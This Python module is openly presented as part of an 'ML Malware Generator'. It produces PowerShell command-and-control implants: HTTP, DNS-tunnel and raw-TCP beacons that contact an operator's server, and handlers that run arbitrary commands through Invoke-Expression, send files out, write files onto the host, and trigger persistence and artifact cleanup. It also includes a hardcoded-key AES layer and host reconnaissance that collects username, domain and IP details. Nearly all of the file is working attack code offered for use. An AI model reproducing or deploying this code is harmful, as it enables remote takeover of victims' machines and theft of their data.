"""
ML Malware Generator - C2 Communication Templates
Templates for Command & Control communication
"""
import hashlib
import base64
import json
from typing import Dict, List, Optional, Tuple
import random
import time

from utils.crypto import get_crypto
from utils.logger import get_logger

logger = get_logger()
crypto = get_crypto()


class C2Template:
    """Base class for C2 communication templates"""
    
    def __init__(self, c2_server: str, c2_port: int):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.encryption_enabled = True
    
    def generate_beacon_code(self) -> bytes:
        """Generate beacon code"""
        raise NotImplementedError
    
    def generate_command_handler(self) -> bytes:
        """Generate command handler code"""
        raise NotImplementedError


class HTTPBeacon(C2Template):
    """HTTP/HTTPS beaconing C2"""
    
    def __init__(
        self,
        c2_server: str,
        c2_port: int = 443,
        use_https: bool = True,
        user_agent: Optional[str] = None,
    ):
        super().__init__(c2_server, c2_port)
        self.use_https = use_https
        self.user_agent = user_agent or self._generate_user_agent()
        self.beacon_interval = 60  # seconds
    
    def _generate_user_agent(self) -> str:
        """Generate realistic user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        ]
        return random.choice(user_agents)
    
    def generate_beacon_code(self) -> bytes:
        """Generate HTTP beacon code"""
        protocol = "https" if self.use_https else "http"
        
        beacon_code = f"""
        # HTTP Beacon
        function Send-Beacon {{
            param($data)
            
            $uri = "{protocol}://{self.c2_server}:{self.c2_port}/api/beacon"
            $headers = @{{
                "User-Agent" = "{self.user_agent}"
                "Content-Type" = "application/json"
            }}
            
            # Encrypt data
            $encrypted = Encrypt-Data $data
            $body = @{{
                "id" = $env:COMPUTERNAME
                "data" = [Convert]::ToBase64String($encrypted)
                "timestamp" = [int][double]::Parse((Get-Date -UFormat %s))
            }} | ConvertTo-Json
            
            try {{
                $response = Invoke-WebRequest -Uri $uri -Method POST -Headers $headers -Body $body -UseBasicParsing
                return $response.Content
            }} catch {{
                return $null
            }}
        }}
        
        # Main beacon loop
        while ($true) {{
            $sysInfo = Get-SystemInfo
            $response = Send-Beacon $sysInfo
            
            if ($response) {{
                Execute-Command $response
            }}
            
            Start-Sleep -Seconds {self.beacon_interval}
        }}
        """.encode('utf-8')
        
        return beacon_code
    
    def generate_command_handler(self) -> bytes:
        """Generate command handler"""
        handler_code = b"""
        # Command Handler
        function Execute-Command {
            param($encryptedCommand)
            
            $command = Decrypt-Data $encryptedCommand
            $cmd = $command | ConvertFrom-Json
            
            switch ($cmd.type) {
                "shell" {
                    $output = Invoke-Expression $cmd.command
                    Send-Response $output
                }
                "download" {
                    $data = [System.IO.File]::ReadAllBytes($cmd.path)
                    Send-Response ([Convert]::ToBase64String($data))
                }
                "upload" {
                    $data = [Convert]::FromBase64String($cmd.data)
                    [System.IO.File]::WriteAllBytes($cmd.path, $data)
                    Send-Response "OK"
                }
                "sleep" {
                    $script:beaconInterval = $cmd.interval
                }
                "exit" {
                    exit
                }
            }
        }
        """
        
        return handler_code


class DNSTunnel(C2Template):
    """DNS tunneling C2"""
    
    def __init__(self, c2_domain: str):
        super().__init__(c2_domain, 53)
        self.c2_domain = c2_domain
        self.max_label_length = 63
    
    def generate_beacon_code(self) -> bytes:
        """Generate DNS tunnel beacon code"""
        beacon_code = f"""
        # DNS Tunnel Beacon
        function Send-DNSBeacon {{
            param($data)
            
            # Encode data in DNS query
            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
            $encoded = $encoded -replace '\\+', '-' -replace '/', '_' -replace '=', ''
            
            # Split into DNS labels (max 63 chars each)
            $chunks = @()
            for ($i = 0; $i -lt $encoded.Length; $i += {self.max_label_length}) {{
                $chunk = $encoded.Substring($i, [Math]::Min({self.max_label_length}, $encoded.Length - $i))
                $chunks += $chunk
            }}
            
            # Create DNS query
            $query = ($chunks -join '.') + '.{self.c2_domain}'
            
            try {{
                $result = Resolve-DnsName -Name $query -Type TXT -ErrorAction SilentlyContinue
                if ($result) {{
                    return $result.Strings -join ''
                }}
            }} catch {{
                return $null
            }}
        }}
        
        # Beacon loop
        while ($true) {{
            $data = Get-SystemInfo
            $response = Send-DNSBeacon $data
            
            if ($response) {{
                Execute-Command $response
            }}
            
            Start-Sleep -Seconds 300  # 5 minutes
        }}
        """.encode('utf-8')
        
        return beacon_code
    
    def generate_command_handler(self) -> bytes:
        """Generate DNS command handler"""
        return b"""
        # DNS Command Handler
        function Execute-Command {
            param($encodedCommand)
            
            $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedCommand))
            $cmd = $decoded | ConvertFrom-Json
            
            # Execute command and exfiltrate via DNS
            $output = Invoke-Expression $cmd.command
            Send-DNSBeacon $output
        }
        """


class CustomProtocol(C2Template):
    """Custom protocol C2"""
    
    def __init__(
        self,
        c2_server: str,
        c2_port: int,
        protocol_id: Optional[bytes] = None,
    ):
        super().__init__(c2_server, c2_port)
        self.protocol_id = protocol_id or self._generate_protocol_id()
    
    def _generate_protocol_id(self) -> bytes:
        """Generate unique protocol identifier"""
        return hashlib.sha256(str(time.time()).encode()).digest()[:4]
    
    def generate_beacon_code(self) -> bytes:
        """Generate custom protocol beacon code"""
        protocol_id_hex = self.protocol_id.hex()
        
        beacon_code = f"""
        # Custom Protocol Beacon
        function Send-CustomBeacon {{
            param($data)
            
            $client = New-Object System.Net.Sockets.TcpClient
            try {{
                $client.Connect("{self.c2_server}", {self.c2_port})
                $stream = $client.GetStream()
                
                # Protocol header
                $header = [byte[]]@(0x{protocol_id_hex})
                $stream.Write($header, 0, $header.Length)
                
                # Encrypt and send data
                $encrypted = Encrypt-Data $data
                $length = [BitConverter]::GetBytes($encrypted.Length)
                $stream.Write($length, 0, 4)
                $stream.Write($encrypted, 0, $encrypted.Length)
                
                # Read response
                $responseLength = New-Object byte[] 4
                $stream.Read($responseLength, 0, 4) | Out-Null
                $length = [BitConverter]::ToInt32($responseLength, 0)
                
                $response = New-Object byte[] $length
                $stream.Read($response, 0, $length) | Out-Null
                
                return Decrypt-Data $response
            }} catch {{
                return $null
            }} finally {{
                $client.Close()
            }}
        }}
        
        # Main loop
        while ($true) {{
            $info = Get-SystemInfo
            $response = Send-CustomBeacon $info
            
            if ($response) {{
                Execute-Command $response
            }}
            
            Start-Sleep -Seconds 120
        }}
        """.encode('utf-8')
        
        return beacon_code
    
    def generate_command_handler(self) -> bytes:
        """Generate custom protocol command handler"""
        return b"""
        # Custom Protocol Command Handler
        function Execute-Command {
            param($command)
            
            $cmd = $command | ConvertFrom-Json
            
            switch ($cmd.action) {
                "exec" {
                    $result = Invoke-Expression $cmd.payload
                    Send-CustomBeacon $result
                }
                "persist" {
                    Add-Persistence
                }
                "cleanup" {
                    Remove-Artifacts
                    exit
                }
            }
        }
        """


class C2TemplateFactory:
    """Factory for creating C2 templates"""
    
    @staticmethod
    def create_http_beacon(
        c2_server: str,
        c2_port: int = 443,
        use_https: bool = True,
    ) -> HTTPBeacon:
        """Create HTTP beacon template"""
        logger.info(f"Creating HTTP beacon for {c2_server}:{c2_port}")
        return HTTPBeacon(c2_server, c2_port, use_https)
    
    @staticmethod
    def create_dns_tunnel(c2_domain: str) -> DNSTunnel:
        """Create DNS tunnel template"""
        logger.info(f"Creating DNS tunnel for {c2_domain}")
        return DNSTunnel(c2_domain)
    
    @staticmethod
    def create_custom_protocol(
        c2_server: str,
        c2_port: int,
    ) -> CustomProtocol:
        """Create custom protocol template"""
        logger.info(f"Creating custom protocol for {c2_server}:{c2_port}")
        return CustomProtocol(c2_server, c2_port)
    
    @staticmethod
    def generate_encryption_functions() -> bytes:
        """Generate encryption/decryption functions for C2"""
        crypto_functions = b"""
        # Encryption Functions for C2
        function Encrypt-Data {
            param($data)
            
            $key = [byte[]]@(0x4B, 0x65, 0x79, 0x31, 0x32, 0x33, 0x34, 0x35, 
                             0x36, 0x37, 0x38, 0x39, 0x30, 0x41, 0x42, 0x43)
            
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = $key
            $aes.GenerateIV()
            
            $encryptor = $aes.CreateEncryptor()
            $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
            $encrypted = $encryptor.TransformFinalBlock($dataBytes, 0, $dataBytes.Length)
            
            # Prepend IV
            $result = $aes.IV + $encrypted
            
            return $result
        }
        
        function Decrypt-Data {
            param($encryptedData)
            
            $key = [byte[]]@(0x4B, 0x65, 0x79, 0x31, 0x32, 0x33, 0x34, 0x35, 
                             0x36, 0x37, 0x38, 0x39, 0x30, 0x41, 0x42, 0x43)
            
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = $key
            
            # Extract IV
            $iv = $encryptedData[0..15]
            $encrypted = $encryptedData[16..($encryptedData.Length-1)]
            
            $aes.IV = $iv
            $decryptor = $aes.CreateDecryptor()
            $decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
            
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
        
        function Get-SystemInfo {
            $info = @{
                hostname = $env:COMPUTERNAME
                username = $env:USERNAME
                os = (Get-WmiObject Win32_OperatingSystem).Caption
                arch = $env:PROCESSOR_ARCHITECTURE
                domain = $env:USERDOMAIN
                ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
            }
            
            return ($info | ConvertTo-Json)
        }
        """
        
        return crypto_functions


# Global factory instance
_c2_factory = None


def get_c2_factory() -> C2TemplateFactory:
    """Get global C2 factory instance"""
    global _c2_factory
    if _c2_factory is None:
        _c2_factory = C2TemplateFactory()
    return _c2_factory
